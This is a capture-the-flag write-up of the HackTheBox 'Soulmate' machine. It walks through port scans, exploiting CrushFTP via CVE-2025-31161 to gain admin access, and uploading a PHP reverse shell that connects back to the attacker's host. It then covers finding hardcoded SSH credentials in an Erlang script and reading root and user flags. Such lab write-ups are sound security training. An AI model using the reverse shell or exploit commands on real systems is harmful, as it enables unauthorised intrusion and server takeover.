---
title: HackTheBox | Soulmate
by: initialt
date: 2025-11-11 20:36:00 +0100
categories: [CTF, walk-trough, hackthebox]
tags: [hackthebox, walk-trough, soulmate, ctf]
image:
  path: /assets/img/2025-11-11-HTB-Soulmate/banner.png
  alt: HackTheBox | Soulmate
---

Soulmate is the Hackbox machine with two flags to catch.

Starting with a regular account in the portal, I tried to register as `admin` and get in return, maybe it will be useful later.
Registering under a different name gives us access to a panel where we have several fields to fill out in a form that appears to be invulnerable to any simple techniques.

> Username already exists

 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/1.png)
_Register page_

Let's do basic scans:

``` bash
└─$ nmap -p- soulmate.htb -T5 -Pn                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 13:02 EST
Warning: 10.10.11.86 giving up on port because retransmission cap hit (2).
Nmap scan report for soulmate.htb (10.10.11.86)
Host is up (0.053s latency).
Not shown: 63430 closed tcp ports (reset), 2101 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
4369/tcp  open  epmd
31337/tcp open  Elite

Nmap done: 1 IP address (1 host up) scanned in 69.53 seconds
```

``` bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -p22,80,4369,31337 -sV -sC soulmate.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 13:04 EST
Nmap scan report for soulmate.htb (10.10.11.86)
Host is up (0.054s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Soulmate - Find Your Perfect Match
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    ssh_runner: 42829
31337/tcp open  ssh     Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  2048 ce:4c:61:f9:6c:c9:79:e3:ae:df:29:de:ef:dc:ec:73 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.33 seconds
```

Interesting port 31337, famously known for the Trojan Back Orifice and many others; here the service banner says "Golang x/crypto/ssh server."

Also 4369 may be interesting; it is the Erlang Port Mapper Daemon, a built-in component that helps Erlang-based applications discover each other’s distribution ports. It can be, for example, RabbitMQ or another queue broker.

Let's put this aside and do some more scans

``` bash
└─$ gobuster dir --url http://soulmate.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -c PHPSESSID=2fvfj869toie7fjaqjnr63okf5
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soulmate.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt
[+] Negative Status codes:   404
[+] Cookies:                 PHPSESSID=2fvfj869toie7fjaqjnr63okf5
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 17118]
/login.php            (Status: 200) [Size: 9023]
/profile.php          (Status: 200) [Size: 13202]
/register.php         (Status: 200) [Size: 11576]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/.                    (Status: 200) [Size: 16688]
/dashboard.php        (Status: 302) [Size: 0] [--> /login]
Progress: 35325 / 35325 (100.00%)
===============================================================
Finished
===============================================================
```

Except `dashboard.php` which is probably some admin panel, but we don't have access there yet. Nothing useful here, so maybe there are some subdomains.

``` bash
ffuf -v -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.86/ -H "Host: FUZZ.soulmate.htb" -fw 4
```

 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/2.png)
_Crush FTP_


I checked if I could log in using my credentials from the main portal, but it is not possible.

Also I checked reset password but I get error there:
`java.lang.Exception: Unknown Host for Reset`

Let's go and serach some ready to go exploits, like <https://github.com/Immersive-Labs-Sec/CVE-2025-31161>

Execute `python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user test1 --password test1 --target_user crushadmin`

Which creates us a new user with admin rights on the FTP server! Which I'm immediately using to change some permissions to upload files to the Soulmate web app catalog.

 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/3.png)
_Crush FTP adding upload permissions_

Then upload a shell file:

``` php
<?php
$sock=fsockopen("my-ip",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

and open netcat on 4242

``` bash
nc -lvnp 4242
```

 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/4.png)
_Crush FTP uploading shell_

We need to act fast, because there is definitely some script that is cleaning files in the soulmate catalog and resetting it to the base state.

 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/5.png)
_Reverse shell opened_

We are acting as www-data user 
 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/6.png)
_Reverse shell opened_

Let's upload `linpeas.sh` and look for the way to escalate

 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/7.png)
_LinPeas_

We get the admin password for the site, but after logging in, we don't see anything interesting. This password also doesn't work on any SSH user.

> ╔══════════╣ Searching passwords in config PHP files
> /var/www/soulmate.htb/config/config.php:            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);      

 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/9.png)
_Admin for the soulmate site_

There is also something interesting happening here:

 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/10.png)
_Erlang scripts and some kind ssh_runner_

Erlang scripts and some kind ssh_runner, let's see what is inside:

``` bash
www-data@soulmate:/usr/local/lib/erlang_login$ cat start.escript
cat start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
www-data@soulmate:/usr/local/lib/erlang_login$ 
```

 ![Desktop View](/assets/img/2025-11-11-HTB-Soulmate/11.png)
_SSH password hardcoded and port_

Erlang seems to have its own SSH server listening only on localhost on port 2222.
Now we have password to try:

``` bash
www-data@soulmate:/usr/local/lib/erlang_login$ ssh ben@localhost -p 2222
ssh ben@localhost -p 2222
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Could not create directory '/var/www/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
ben@localhost's password: HouseH0ldings998

Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
```

Okay, we are in, and this is Erlang Eshell, so commands are a little different than in bash, but after some searching I figured it out and gathered flags:

```
(ssh_runner@soulmate)7> pwd().
(ssh_runner@soulmate)7> pwd().
/root
ok

(ssh_runner@soulmate)9> ls()
ls()
(ssh_runner@soulmate)9> ls()
                        .
.bash_history        .bashrc              .cache               
.config              .erlang.cookie       .local               
.profile             .selected_editor     .sqlite_history      
.ssh                 .wget-hsts           root.txt             
scripts              
ok

(ssh_runner@soulmate)6> {ok, Binary} = file:read_file("root.txt").
(ssh_runner@soulmate)6> {ok, Binary} = file:read_file("root.txt").
{ok,<<"7e7d434996ba703ce6d19d---SNIP---\n">>}

(ssh_runner@soulmate)10> cd("/home/ben").
(ssh_runner@soulmate)10> cd("/home/ben").
/home/ben
ok

(ssh_runner@soulmate)11> ls().
(ssh_runner@soulmate)11> ls().
.bash_history     .bash_logout      .bashrc           .cache            
.profile          .ssh              user.txt          
ok

(ssh_runner@soulmate)12> {ok, Binary} = file:read_file("user.txt").
(ssh_runner@soulmate)12> {ok, Binary} = file:read_file("user.txt").
** exception error: no match of right hand side value {ok,
<<"37c1593eb16a19d746be---SNIP---\n">>}
(ssh_runner@soulmate)13> 
```